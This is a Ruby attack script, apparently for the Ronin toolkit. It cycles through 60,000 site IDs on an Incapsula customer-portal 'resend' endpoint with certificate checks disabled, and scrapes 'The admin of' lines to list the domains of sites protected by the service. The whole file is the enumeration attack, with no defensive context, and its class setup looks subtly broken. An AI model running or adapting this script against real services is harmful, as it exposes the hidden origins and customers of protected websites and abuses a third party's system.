#!/usr/bin/env ruby

require 'ronin/support'
require 'cgi'

include Ronin
include Ronin::Network
include Ronin::Network::HTTP

class IncapsulaHostDump
  include Singleton

  def initialize(arange, options = {})
    aret, @@save_path, @@save_url = Array.new, options[:path].clone, options[:url].clone

    arange.each do |k|
      options[:url] = @@save_url + k.to_s
      options[:path] = @@save_path + k.to_s
      page = http_request(options)
      line = page.body

      next if not line or line.empty?

      line.split("\n").each do |l|
        l.lstrip!

	next if l.empty?

        aind = l.start_with?('The admin of')

	next if not aind

        adom = l.split[3]
	aind = adom.index('_')

	next if not aind or aind.zero?

	STDOUT.puts adom[0 .. (aind -= 1)]

	aret << adom
      end
    end

    aret
  end
end

optz = {:ssl => true, 
        :port => 443,
	:host => 'my.incapsula.com',
	:url => 'https://my.incapsula.com/secure/lp/resend?siteId=',
	:method => :GET,
	:path => '/secure/lp/resend?siteId=',
	:headers => {:User_Agent => 'MSIE', :Host => 'my.incapsula.com'} }

Ronin::Network::SSL_VERIFY = false

IncapsulaHostDump.new(Range.new(1, 60000), optz)

STDERR.puts '*** Done! You may want to run sort/uniq on the results..'

exit 0
